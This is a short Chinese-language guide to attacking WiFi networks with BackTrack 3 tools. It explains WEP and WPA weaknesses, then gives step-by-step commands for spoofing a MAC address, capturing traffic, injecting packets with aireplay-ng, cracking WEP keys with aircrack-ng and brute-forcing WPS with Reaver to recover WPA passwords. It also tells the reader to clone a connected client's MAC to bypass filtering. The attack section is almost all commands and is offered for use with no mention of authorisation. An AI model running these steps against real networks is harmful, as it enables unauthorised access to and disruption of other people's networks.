# WiFi攻击指南(bt3)


## 理论

### WEP

WEP，或者说是有限等效加密，是第一种被采用的无线安全体制。顾名思义，它旨在为终端用户提供基本等同于有限环境中享有的隐私安全性。但这个机制不幸地失败了。 

由于许多原因，由于RC4加密算法有缺陷的实现方法，导致WEP极其容易被破解。5分钟内破解WEP并不罕见。这是因为WEP使用可以在数据流中被捕获的非常短的初始化向量，这个初始化向量可以被用于使用统计技术发现密码。

### WPA

WPA是工业界对于WEP的被公开的弱点的应对系统。为了与WPA2区别开来，它通常被称为WPA1。

WPA使用了临时密钥完整性协议(TKIP)来在不需要新的硬件设施的情况下，提升WEP的安全性。它仍然使用WEP来加密，但它使得用于攻击WEP的统计攻击更加困难和费时。


### WPA2-PSK

WPA2-PSK是给家庭或小型企业用户的WPA2实现。顾名思义，它是使用预先共享密钥(PSK)的WPA2实现。这是如今大多数家庭使用的安全标准，虽然安全性更高，但仍然容易受到各种攻击。

2007年添加的Wifi保护设置的功能，允许我们绕过WP2-PSK的安全性。

### WPA2-AES
WPA2-AES是WPA2的企业级实现。它使用高级加密标准或AES加密数据，是最安全的。它通常与专用于身份验证的RADIUS服务器相结合。



## 攻击WIFI密码：


### 攻击WEP

（成功取决于与无线接入点的远近）

1) 更改你的MAC地址

```
$ airmon-ng ---> take note of the name of your network interfaces (example wlan0)
$ airmon-ng stop INTERFACENAME
$ ifconfig INTERFACENMAE down
$ macchanger --mac 00:11:22:33:44:55
```

2) 选取你的网络(BSSID):

```
$ airodump-ng INTERFACENAME
```

3) 查看网络上发生的情况并把信息捕获到文件中：

```
$ airodump-ng -c CHANNEL -W FILENAME --bssid BSSID INTERFACENAME
```

4) 打开一个新的控制台和类型(ESSID是无线接入点的SSID名):

```
$ aireplay-ng -1 0 -a BSSID -h 00:11:22:33:44:55 -e ESSID INTERFACE
$ aireplay-ng -3 -b BSSID -h 00:11:22:33:44:55 INTERFACE
```

5) 一旦你收集了足够的数据，打开第三个控制台并攻击数据：

```
$ aircrack-ng -b BSSID FILENAME-01.cap
```


### 攻击WPA

* 这大约需要2-6小时。
* 可以导致DoS攻击。
* 如果路由器有MAC过滤功能，那么使用网络监控工具查找与路由器连接的系统的MAC地址，然后将其设置为攻击平台的地址。

1) 找到你的无线网卡：

```
$ iwconfig
```

2) 将无线网卡设置为监听模式：

```
$ airmon-ng start wlan0
```

或

```
$ ifconfig wlan0 down
$ iwconfig wlan0 mode monitor
$ ifconfig wlan0 up
```

3) 找到路由器的BSSID来攻击
```
$ airodump-ng wlan0 --> mon0 if this does not work
```

4) 使用Reaver攻击Network的WPA密码：

```
$ reaver -i mon0 -b BSSID -vv
```

